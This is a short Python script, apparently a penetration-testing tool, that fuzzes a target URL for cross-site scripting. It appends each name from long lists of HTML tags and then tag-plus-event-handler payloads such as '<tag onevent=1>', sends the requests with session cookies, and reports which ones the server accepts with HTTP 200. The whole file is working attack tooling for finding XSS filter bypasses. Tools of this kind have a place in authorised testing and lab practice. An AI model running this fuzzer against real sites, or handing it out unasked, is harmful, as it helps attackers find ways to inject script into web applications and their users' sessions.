#!/usr/bin/python3

import requests, signal
from colorama import Back, Fore, Style
from pwn import *
red = Fore.RED
end = Style.RESET_ALL


def sig_handler(sig, frame):
    print(Fore.YELLOW + "\n\n\t[!] " + Style.RESET_ALL + "Saliendo...\n")
    sys.exit(1)
 
signal.signal(signal.SIGINT, sig_handler)



burp0_url = ""
burp0_cookies = {"session": ""}
burp0_headers = {"User-Agent": ""}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

etiqueta = []
status = []
lenght = []


events = ["onafterprint","onafterscriptexecute","onanimationcancel","onanimationend","onanimationiteration","onanimationstart","onauxclick","onbeforecopy","onbeforecut","onbeforeinput","onbeforeprint","onbeforescriptexecute","onbeforeunload","onbegin","onblur","onbounce","oncanplay","oncanplaythrough","onchange","onclick","onclose","oncontextmenu","oncopy","oncuechange","oncut","ondblclick","ondrag","ondragend","ondragenter","ondragleave","ondragover","ondragstart","ondrop","ondurationchange","onend","onended","onerror","onfinish","onfocus","onfocusin","onfocusout","onfullscreenchange","onhashchange","oninput","oninvalid","onkeydown","onkeypress","onkeyup","onload","onloadeddata","onloadedmetadata","onmessage","onmousedown","onmouseenter","onmouseleave","onmousemove","onmouseout","onmouseover","onmouseup","onmousewheel","onmozfullscreenchange","onpagehide","onpageshow","onpaste","onpause","onplay","onplaying","onpointerdown","onpointerenter","onpointerleave","onpointermove","onpointerout","onpointerover","onpointerrawupdate","onpointerup","onpopstate","onprogress","onratechange","onrepeat","onreset","onresize","onscroll","onscrollend","onsearch","onseeked","onseeking","onselect","onselectionchange","onselectstart","onshow","onstart","onsubmit","ontimeupdate","ontoggle","ontouchend","ontouchmove","ontouchstart","ontransitioncancel","ontransitionend","ontransitionrun","ontransitionstart","onunhandledrejection","onunload","onvolumechange","onwebkitanimationend","onwebkitanimationiteration","onwebkitanimationstart","onwebkittransitionend","onwheel"]
tags = ["a","a2","abbr","acronym","address","animate","animatemotion","animatetransform","applet","area","article","aside","audio","audio2","b","bdi","bdo","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","command","content","custom tags","data","datalist","dd","del","details","dfn","dialog","dir","div","dl","dt","element","em","embed","fieldset","figcaption","figure","font","footer","form","frame","frameset","h1","head","header","hgroup","hr","html","i","iframe","iframe2","image","image2","image3","img","img2","input","input2","input3","input4","ins","kbd","keygen","label","legend","li","link","listing","main","map","mark","marquee","menu","menuitem","meta","meter","multicol","nav","nextid","nobr","noembed","noframes","noscript","object","ol","optgroup","option","output","p","param","picture","plaintext","pre","progress","q","rb","rp","rt","rtc","ruby","s","samp","script","section","select","set","shadow","slot","small","source","spacer","span","strike","strong","style","sub","summary","sup","svg","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","tt","u","ul","var","video","video2","wbr","xmp"]

#tags = ["body"]

def req():

    cabeceras = burp0_headers
    cookies = burp0_cookies
    p1 = log.progress("Buscando etiquetas")

    for tag in tags:
        url = burp0_url + "<" + tag + ">"
        result = requests.get(url, headers=cabeceras, cookies=cookies)
        p1.status("<" + "tag" + ">" + "%s [%d] %s" % (result.status_code, len(result.text) - len(tag), tag))

        if result.status_code == 200:
            etiqueta.append(tag)
            status.append(result.status_code)
            lenght.append(len(result.text))
            #print("<" + tag + ">") 
            #p1.status("Iniciando proceso de fuerza bruta")
    return etiqueta, status, lenght


def result():

    for i,j,k in zip(etiqueta,status,lenght):
        print(red + "[!]" + "<" + i + "> " + end + "[%d] [%d]" % (j, k))
        #print(red + "<" + i + ">" + end)

        #p2.status("iniciando...")

    
    for i in etiqueta:
        cabeceras = burp0_headers
        cookies = burp0_cookies

        p2 = log.progress("Buscando eventos para %s" % i)


        for x in events:
            payload = "<" + i + "%20" + x + "=1>"
            url = burp0_url + payload
            result = requests.get(url, headers=cabeceras, cookies=cookies)
            p2.status(url)

            if result.status_code == 200:
                print(red + "[!] " + end + "%s [%d] %s %s" % (result.status_code, len(result.text) - len(payload), i, x))


if __name__ == "__main__":

    req()
    result()
